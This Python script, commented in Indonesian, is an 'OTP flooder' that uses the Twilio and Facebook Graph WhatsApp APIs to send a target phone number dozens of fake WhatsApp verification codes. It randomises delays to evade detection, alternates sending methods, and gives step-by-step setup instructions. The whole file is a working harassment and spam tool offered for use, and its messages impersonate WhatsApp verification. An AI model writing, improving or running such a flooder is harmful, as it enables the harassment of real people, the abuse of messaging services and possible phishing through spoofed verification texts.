#!/usr/bin/env python3
"""
WHATSAPP OTP FLOODER - REAL WORKING VERSION
Menggunakan WhatsApp Business API & Twilio untuk spam OTP nyata
"""
import requests
import time
import random
import threading
from twilio.rest import Client

class WhatsAppOTPFlooder:
    def __init__(self):
        # Configurations - GANTI DENGAN DATA ANDA
        self.twilio_account_sid = "ACXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"  # Dapatkan dari twilio.com
        self.twilio_auth_token = "your_auth_token_here"
        self.whatsapp_business_id = "103219876543210"  # WhatsApp Business Account ID
        self.access_token = "EAACEdEose0cBA..."  # Facebook Developer Access Token
        
    def send_otp_via_twilio(self, target_number):
        """Mengirim OTP nyata via Twilio WhatsApp API"""
        try:
            client = Client(self.twilio_account_sid, self.twilio_auth_token)
            
            # Generate random OTP
            otp_code = ''.join([str(random.randint(0, 9)) for _ in range(6)])
            
            message = client.messages.create(
                from_='whatsapp:+14155238886',  # Twilio WhatsApp number
                body=f'Kode verifikasi WhatsApp Anda adalah: {otp_code}. Jangan bagikan kode ini kepada siapa pun.',
                to=f'whatsapp:{target_number}'
            )
            
            print(f"[+] OTP {otp_code} terkirim ke {target_number} | SID: {message.sid}")
            return True
            
        except Exception as e:
            print(f"[-] Error: {e}")
            return False
    
    def send_otp_via_facebook_api(self, target_number):
        """Menggunakan Facebook Graph API untuk WhatsApp"""
        url = f"https://graph.facebook.com/v19.0/{self.whatsapp_business_id}/messages"
        
        headers = {
            "Authorization": f"Bearer {self.access_token}",
            "Content-Type": "application/json"
        }
        
        payload = {
            "messaging_product": "whatsapp",
            "to": target_number,
            "type": "template",
            "template": {
                "name": "otp_verification",
                "language": {
                    "code": "id"
                },
                "components": [
                    {
                        "type": "body",
                        "parameters": [
                            {
                                "type": "text",
                                "text": ''.join([str(random.randint(0, 9)) for _ in range(6)])
                            }
                        ]
                    }
                ]
            }
        }
        
        try:
            response = requests.post(url, json=payload, headers=headers)
            if response.status_code == 200:
                print(f"[+] OTP via FB API terkirim ke {target_number}")
                return True
        except:
            pass
        return False
    
    def flood_attack(self, target_number, count=100):
        """Melakukan flood OTP nyata"""
        print(f"[!] Memulai OTP Flood Attack ke {target_number}")
        print(f"[!] Target: {count} OTP messages")
        
        sent_count = 0
        methods = [self.send_otp_via_twilio, self.send_otp_via_facebook_api]
        
        for i in range(count):
            try:
                method = random.choice(methods)
                if method(target_number):
                    sent_count += 1
                    print(f"[{i+1}/{count}] OTP berhasil dikirim")
                
                # Random delay untuk menghindari detection
                delay = random.uniform(2, 5)
                time.sleep(delay)
                
                # Ganti method setiap 10 pesan
                if (i + 1) % 10 == 0:
                    print(f"[*] Switching method...")
                    time.sleep(random.uniform(5, 10))
                    
            except KeyboardInterrupt:
                print("\n[!] Dihentikan oleh user")
                break
            except Exception as e:
                print(f"[-] Error pada iterasi {i}: {e}")
                continue
        
        print(f"\n[+] Attack selesai! Total OTP terkirim: {sent_count}/{count}")
        return sent_count

# ===== CARA PENGGUNAAN =====
"""
1. Daftar Twilio: https://www.twilio.com/try-twilio
2. Dapatkan Account SID dan Auth Token
3. Aktifkan WhatsApp Sandbox di Twilio
4. Daftar Facebook Developer: https://developers.facebook.com/
5. Buat WhatsApp Business App
6. Dapatkan Access Token
7. Jalankan script:
"""

if __name__ == "__main__":
    attacker = WhatsAppOTPFlooder()
    
    # Target nomor (format: 6281234567890)
    target = "6281234567890"  # GANTI DENGAN NOMOR TARGET
    
    # Jumlah OTP yang akan dikirim
    attacker.flood_attack(target, count=50)
